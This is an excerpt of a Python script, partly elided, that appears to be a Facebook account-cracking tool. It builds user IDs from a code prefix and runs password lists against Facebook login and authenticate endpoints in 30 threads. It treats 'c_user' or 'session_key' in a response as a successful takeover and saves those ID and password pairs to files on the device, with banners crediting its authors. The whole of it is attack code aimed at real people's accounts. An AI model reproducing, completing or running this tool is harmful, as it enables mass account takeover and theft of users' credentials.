...
def bd():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print(f'\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;32m [+] OK IDZ SAVE ✓ BILLA-OK.txt")
                        print("\033[1;32m [+] CP IDZ SAVE × BILLA-CP.txt")
                        print("\033[1;32m [+] WE ARE MUSLIM TECH TEAM ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BILAL-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                print('\r\r\033[1;32m [BILLA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/M_TECH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BILLA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [BILLA-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [BILLA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [BILLA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BILLA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [BILLA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/BILLA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
